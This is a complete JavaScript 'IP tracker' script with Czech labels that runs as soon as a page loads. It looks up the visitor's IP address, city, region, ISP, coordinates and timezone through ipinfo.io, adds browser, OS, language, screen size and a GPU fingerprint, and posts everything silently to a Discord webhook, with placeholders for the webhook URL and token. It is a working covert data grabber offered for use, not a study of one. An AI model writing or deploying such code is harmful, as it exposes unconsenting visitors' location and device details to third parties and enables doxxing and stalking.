const webhookURL = "YOUR_DISCORD_WEBHOOK";
const ipInfoToken = "YOUR_IPINFO_TOKEN";

async function trackUser() {
    try {
        const ipResponse = await fetch(`https://ipinfo.io/json?token=${ipInfoToken}`);
        const ipData = await ipResponse.json();

        const ip = ipData.ip || "Neznámá IP";
        const city = ipData.city || "Neznámé město";
        const region = ipData.region || "Neznámý region";
        const country = ipData.country || "Neznámá země";
        const org = ipData.org || "Neznámý ISP";
        const loc = ipData.loc || "Neznámá poloha";
        const timezone = ipData.timezone || "Neznámé časové pásmo";

        const userAgent = navigator.userAgent;
        const platform = navigator.platform || "Neznámá platforma";
        const language = navigator.language || "Neznámý jazyk";
        const screenWidth = screen.width || "Neznámé";
        const screenHeight = screen.height || "Neznámé";
        const gpu = getGPU() || "Neznámé GPU";
        const browser = getBrowser() || "Neznámý prohlížeč";
        const os = getOS() || "Neznámý OS";

        const visitTime = new Date().toLocaleString("cs-CZ", { timeZone: timezone });

        const message = {
            content: "**🔍 Nový návštěvník**",
            embeds: [{
                title: "📡 IP Tracker Log",
                color: 0x3498db,
                fields: [
                    { name: "🌐 IP Adresa", value: `\`${ip}\``, inline: true },
                    { name: "📍 Město", value: city, inline: true },
                    { name: "🗺️ Region", value: region, inline: true },
                    { name: "🏳️ Země", value: country, inline: true },
                    { name: "🏢 ISP", value: org, inline: true },
                    { name: "📌 Souřadnice", value: loc, inline: true },
                    { name: "⏰ Časové pásmo", value: timezone, inline: true },
                    { name: "🕒 Čas návštěvy", value: visitTime, inline: true },
                    { name: "🖥️ OS", value: os, inline: true },
                    { name: "🌍 Jazyk", value: language, inline: true },
                    { name: "📡 Prohlížeč", value: browser, inline: true },
                    { name: "🎮 GPU", value: gpu, inline: true },
                    { name: "📏 Rozlišení", value: `${screenWidth}x${screenHeight}`, inline: true },
                    { name: "🔍 User Agent", value: `\`\`\`${userAgent}\`\`\`` }
                ],
                footer: { text: "📡 Automatický IP Tracker" }
            }]
        };

        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(message)
        });

    } catch (error) {
        console.error("❌ Chyba při sledování:", error);
    }
}

function getGPU() {
    try {
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        if (!gl) return "Nepodporováno";
        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Neznámé";
    } catch {
        return "Neznámé";
    }
}

function getBrowser() {
    const userAgent = navigator.userAgent;
    if (userAgent.includes("Firefox")) return "Mozilla Firefox";
    if (userAgent.includes("Edg")) return "Microsoft Edge";
    if (userAgent.includes("Chrome")) return "Google Chrome";
    if (userAgent.includes("Safari")) return "Apple Safari";
    if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera";
    return "Neznámý prohlížeč";
}

function getOS() {
    const platform = navigator.platform.toLowerCase();
    if (platform.includes("win")) return "Windows";
    if (platform.includes("mac")) return "MacOS";
    if (platform.includes("linux")) return "Linux";
    if (platform.includes("android")) return "Android";
    if (platform.includes("iphone") || platform.includes("ipad")) return "iOS";
    return "Neznámý OS";
}

trackUser();
